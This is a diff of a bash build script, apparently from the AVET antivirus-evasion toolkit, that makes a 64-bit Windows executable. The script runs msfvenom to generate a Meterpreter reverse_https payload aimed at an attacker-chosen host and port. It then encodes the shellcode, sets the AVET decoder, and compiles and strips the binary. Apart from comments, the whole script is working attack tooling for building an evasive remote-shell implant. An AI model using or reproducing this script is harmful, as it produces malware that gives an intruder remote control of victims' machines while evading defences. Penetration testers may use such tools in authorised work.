@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/bash    
 # example script for building executables with 64bit payload
 
 # include script containing the compiler var $win64_compiler
@@ -17,16 +17,20 @@ LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$LHOST -e x64/xor lport=$LPORT -f c --platform Windows > input/sc.txt
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f c --platform Windows > input/sc_c.txt
 
-# add fopen sandbox evasion technique
-add_evasion fopen_sandbox_evasion
+# Apply AVET encoding
+encode_shellcode input/sc_c.txt input/scenc_raw.txt
+
+# convert to c array format for static include
+./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
 
 # set shellcode source
-set_shellcode_source static_from_file input/sc.txt
+set_shellcode_source static_from_file input/scenc_c.txt
 
 # set decoder and key source
-set_decoder none
+# AVET decoder requires no key
+set_decoder avet
 set_key_source none
 
 # set shellcode binding technique
@@ -35,7 +39,7 @@ set_shellcode_binding exec_shellcode64
 # enable debug output
 enable_debug_print
 
-# compile
+# call make_avet, compile 
 $win64_compiler -o output/output.exe source/avet.c
 strip output/output.exe
 
